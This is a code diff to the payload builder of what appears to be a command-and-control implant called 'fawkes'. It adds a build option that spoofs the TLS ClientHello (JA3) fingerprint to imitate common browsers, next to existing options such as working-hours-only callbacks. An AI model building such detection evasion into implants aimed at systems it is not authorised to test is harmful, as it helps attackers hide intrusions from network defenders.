@@ -129,6 +129,14 @@ var payloadDefinition = agentstructs.PayloadType{
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
 		},
 		{
+			Name:          "tls_fingerprint",
+			Description:   "TLS ClientHello fingerprint to mimic. Spoofs the JA3/JA3S hash to match a real browser. 'go' = default Go TLS stack (no spoofing). 'chrome' = Chrome/Chromium. 'firefox' = Firefox. 'safari' = Safari. 'edge' = Edge. 'random' = randomized fingerprint.",
+			Required:      false,
+			DefaultValue:  "chrome",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
+			Choices:       []string{"chrome", "firefox", "safari", "edge", "random", "go"},
+		},
+		{
 			Name:          "working_hours_start",
 			Description:   "Optional: Working hours start time in HH:MM 24-hour format (e.g. '09:00'). Agent only calls back during working hours. Leave empty for always-active.",
 			Required:      false,
@@ -397,6 +405,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	if tlsVerify, err := payloadBuildMsg.BuildParameters.GetStringArg("tls_verify"); err == nil && tlsVerify != "" {
 		ldflags += fmt.Sprintf(" -X '%s.tlsVerify=%s'", fawkes_main_package, tlsVerify)
+	}
+	if tlsFP, err := payloadBuildMsg.BuildParameters.GetStringArg("tls_fingerprint"); err == nil && tlsFP != "" && tlsFP != "go" {
+		ldflags += fmt.Sprintf(" -X '%s.tlsFingerprint=%s'", fawkes_main_package, tlsFP)
 	}
 
 	// TCP P2P bind address
